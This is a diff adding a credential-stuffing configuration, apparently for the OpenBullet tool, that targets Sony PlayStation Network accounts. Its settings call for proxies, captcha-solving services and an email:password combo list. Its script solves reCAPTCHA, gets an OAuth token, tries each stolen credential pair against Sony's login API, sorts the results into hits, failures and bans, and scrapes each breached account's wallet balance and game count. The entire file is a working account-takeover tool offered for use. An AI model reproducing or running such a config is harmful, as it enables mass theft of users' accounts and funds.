@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "PSN",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-10T20:22:16.5705878+00:00",
+  "AdditionalInfo": "Need captcha service, Recommend captcha services : \"AntiCaptcha\" and \"2captcha\",  Free hits means that it need \"MailAccess\" , \" BlueRar \"",
+  "Author": "Bluerar",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1416969896
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 36985195
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1916806709
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#T REQUEST GET "https://id.sonyentertainmentnetwork.com/signin/?client_id=55950157-ae9d-4b10-b0de-94dbef199f2c&scope=openid%2Ckamaji%3Aprivacy_control%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_set_feed_privacy&state=e30%3D&redirect_uri=https%3A%2F%2Faccount.sonyentertainmentnetwork.com%2Foauth_security_check&response_type=code&prompt=login&ui=pr&noEVBlock=false&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#key1 KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<HEADERS{*}>" DoesNotContain "ETag" 
+RECAPTCHA "https://id.sonyentertainmentnetwork.com/signin/?client_id=55950157-ae9d-4b10-b0de-94dbef199f2c&scope=openid%2Ckamaji%3Aprivacy_control%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_set_feed_privacy&state=e30%3D&redirect_uri=https%3A%2F%2Faccount.sonyentertainmentnetwork.com%2Foauth_security_check&response_type=code&prompt=login&ui=pr&noEVBlock=false&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin" "6LdSoRkTAAAAAAhKr1g2Zy4cCtE4hrgwIBdMYhXL" -> VAR "c" 
+#t REQUEST POST "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=captcha&captcha_provider=google%3Arecaptcha-v2&scope=oauth%3Aauthenticate&valid_for=<USER>&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&client_secret=xSk2YI8qJqZfeLQv&response_token=<c>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://id.sonyentertainmentnetwork.com" 
+  HEADER "HOST: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "DNT: 1" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/signin/?client_id=55950157-ae9d-4b10-b0de-94dbef199f2c&scope=openid%2Ckamaji%3Aprivacy_control%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_set_feed_privacy&state=e30%3D&redirect_uri=https%3A%2F%2Faccount.sonyentertainmentnetwork.com%2Foauth_security_check&response_type=code&prompt=login&ui=pr&noEVBlock=false&error=login_required&error_code=4165&error_description=User+is+not+authenticated" 
+#key2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "captcha_response_invalid" 
+    KEY "Invalid token" 
+  KEYCHAIN Ban OR 
+    KEY "<HEADERS{*}>" DoesNotContain "X-CorrelationId" 
+#access PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" Recursive=FALSE -> VAR "token" "" "" 
+REQUEST POST "https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie" AutoRedirect=TRUE 
+  CONTENT "{\"authentication_type\":\"password\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"71a7beb8-f21a-47d9-a604-2e71bee24fe0\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Origin: https://id.sonyentertainmentnetwork.com" 
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/signin/?client_id=55950157-ae9d-4b10-b0de-94dbef199f2c&scope=openid%2Ckamaji%3Aprivacy_control%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_set_feed_privacy&state=e30%3D&redirect_uri=https%3A%2F%2Faccount.sonyentertainmentnetwork.com%2Foauth_security_check&response_type=code&prompt=login&ui=pr&noEVBlock=false&error=login_required&error_code=4165&error_description=User+is+not+authenticated" 
+#key2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\"error\":\"invalid_grant\",\"error_description\":\"Invalid login" 
+  KEYCHAIN Ban OR 
+    KEY "<HEADERS{*}>" DoesNotContain "X-CorrelationId" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "error_description\":\"Password expired" 
+REQUEST GET "https://account.sonyentertainmentnetwork.com/liquid/home/index!display.action?" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/signin/?client_id=55950157-ae9d-4b10-b0de-94dbef199f2c&scope=openid%2Ckamaji%3Aprivacy_control%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_set_feed_privacy&state=e30%3D&redirect_uri=https%3A%2F%2Faccount.sonyentertainmentnetwork.com%2Foauth_security_check&response_type=code&prompt=login&ui=pr&noEVBlock=false&error=login_required&error_code=4165&error_description=User+is+not+authenticated" 
+#Wallet PARSE "<SOURCE>" LR "walletCat\" class=\"homeHeaderIndicator\">" "<" Recursive=FALSE -> CAP "Wallet" "" "" 
+#Games PARSE "<SOURCE>" LR "homeMediaGameCount\" class=\"homeMediaCount hovChange\">" "<" Recursive=FALSE -> CAP "GAMES" "" "" 
+#Key3 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "spring_security_logout\">Sign Out" 
